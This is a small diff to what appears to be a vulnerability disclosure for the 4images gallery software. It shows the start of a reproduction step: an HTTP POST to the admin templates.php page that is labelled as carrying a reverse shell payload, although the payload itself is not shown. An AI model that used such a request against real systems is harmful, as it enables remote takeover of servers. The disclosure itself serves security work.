@@ -13,6 +13,7 @@ To reproduce do the following:
 
 ```
 // HTTP POST request showing reverse shell payload
+
 POST /4images/admin/templates.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
